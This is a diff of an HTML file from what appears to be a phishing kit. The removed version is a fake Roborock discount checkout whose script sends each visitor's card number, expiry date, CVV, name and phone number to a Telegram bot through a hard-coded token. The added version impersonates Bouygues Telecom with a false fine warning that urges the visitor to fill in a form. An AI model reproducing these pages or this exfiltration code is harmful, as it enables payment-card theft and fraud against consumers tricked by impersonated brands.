@@ -1,224 +1,71 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de Paiement</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="description" content="Important Notice from Bouygues Telecom">
+    <title>Notification de Frais - Bouygues Telecom</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        #card-error {
-            display: none;
-            color: red;
-            font-size: 0.9rem;
-            margin-top: 5px;
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 90%;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #d9534f;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #333;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        .number {
+            font-weight: bold;
+            color: #5bc0de;
+        }
+        .cta {
+            margin-top: 20px;
+        }
+        .cta button {
+            background-color: #0275d8;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .cta button:hover {
+            background-color: #025aa5;
         }
     </style>
 </head>
-<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
-
-    <!-- Card de produit avec image en haut -->
-    <div class="product-card bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
-        <!-- Image produit -->
-        <div class="flex justify-center mb-6">
-            <img src="S8MaxVUltra_A_Fr.webp" alt="S8 MaxV Ultra" class="w-48 h-auto rounded-md shadow-lg">
-        </div>
-        <div class="product-info text-center">
-            <h3 class="text-xl font-semibold text-gray-800">S8 MaxV Ultra</h3>
-            <p class="text-lg text-green-600 mt-2">799€ <span class="line-through text-red-500">1499€</span></p>
+<body>
+    <div class="container">
+        <h1>Avertissement : Glissement Financier</h1>
+        <p>Un frais important sera appliqué au numéro suivant :</p>
+        <p class="number">0628789420 / +33</p>
+        <p>Service : <strong>Bouygues Telecom</strong></p>
+        <p>Pour éviter cette amende, veuillez prendre des mesures immédiatement.</p>
+        <div class="cta">
+            <button onclick="window.location.href='formulaire.html';">Remplir le Formulaire</button>
         </div>
     </div>
-
-<input type="hidden" id="prix" value="799">
-
-<!-- Barre de progression -->
-        <div class="progress-bar">
-            <div class="step active">
-                <span>1</span>
-                <p>Produit</p>
-            </div>
-            <div class="step active">
-                <span>2</span>
-                <p>Informations</p>
-            </div>
-            <div class="step">
-                <span>3</span>
-                <p>Confirmation</p>
-            </div>
-        </div>
-
-    <!-- Formulaire de paiement -->
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-6">
-        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Paiement</h1>
-        <p class="text-sm text-center text-gray-600 mb-6">
-            Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
-            Ce processus est sécurisé et protégé.
-        </p>
-        
-        <!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="ALTP-page-CB.jpg" alt="paiement sécurisé" class="w-52 h-auto">
-        </div>
-
-            <!-- Numéro de carte -->
-            <div class="mb-4">
-                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
-                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-                <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être valide et respecter le format.</p>
-            </div>
-
-            <!-- Date d'expiration -->
-            <div class="mb-4">
-                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
-                <input type="month" id="date-expiration" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Code CVV -->
-            <div class="mb-4">
-                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
-                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Formulaire -->
-        <form id="paiement-form">
-            <!-- Titulaire de la carte -->
-            <div class="mb-4">
-                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
-                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Numéro de téléphone -->
-            <div class="mb-4">
-                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
-                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Bouton de validation -->
-            <button type="submit"
-                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-                Valider mon paiement
-            </button>
-         </form>
-
-<!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="instrumentys_paiement_securise_logo.jpg" alt="paiement sécurisé" class="w-52 h-auto">
-        </div>
-    </div>
-    </form>
-
- <!-- FOOTER -->
-<footer class="bg-gray-800 text-white py-8">
-    <div class="max-w-6xl mx-auto px-4">
-        <!-- Haut du footer : Liens et Réseaux Sociaux -->
-        <div class="flex flex-col md:flex-row justify-between items-center md:items-start">
-            <!-- Logo et description -->
-            <div class="mb-6 md:mb-0">
-                <img src="roborock.png" alt="Roborock Logo" class="h-12 mb-4">
-                <p class="text-sm text-gray-400">
-                    Explorez un monde de nettoyage intelligent avec Roborock, conçu pour votre confort quotidien.
-                </p>
-            </div>
-
-            <!-- Liens utiles -->
-            <div class="flex space-x-8">
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Produits</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">Aspirateurs Robots</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Accessoires</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Nouveautés</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Support</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">FAQ</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Manuels</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Contact</a></li>
-                    </ul>
-                </div>
-            </div>
-
-            <!-- Réseaux sociaux -->
-            <div class="mt-6 md:mt-0">
-                <h4 class="text-lg font-bold mb-4">Suivez-nous</h4>
-                <div class="flex space-x-4">
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-facebook fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-twitter fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-instagram fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-youtube fa-lg"></i>
-                    </a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Bas du footer : Droits réservés -->
-        <div class="mt-10 border-t border-gray-700 pt-6 text-center text-sm text-gray-500">
-            <p>&copy; 2025 Roborock. Tous droits réservés. | <a href="#" class="hover:underline">Politique de confidentialité</a> | <a href="#" class="hover:underline">Conditions d'utilisation</a></p>
-        </div>
-    </div>
-</footer>
-
-
-    <script>
-        document.getElementById("paiement-form").addEventListener("submit", async function(event) {
-            event.preventDefault();
-
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const PRIX = document.getElementById("prix").value;
-
-
-            // Send to Telegram bot
-            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-            const chatId = "5372119436";
-
-            const message = `
-🔔 Nouvelle Demande de Paiement 🔔
-👤 Nom: ${nom}
-💳 Numéro de Carte: ${numeroCarte}
-📅 Expiration: ${dateExpiration}
-🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-🔔 Prix : ${PRIX} EURO`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                });
-
-                window.location.href = "Traitement.html";
-            } catch (error) {
-                alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-            }
-        });
-    </script>
-
 </body>
 </html>
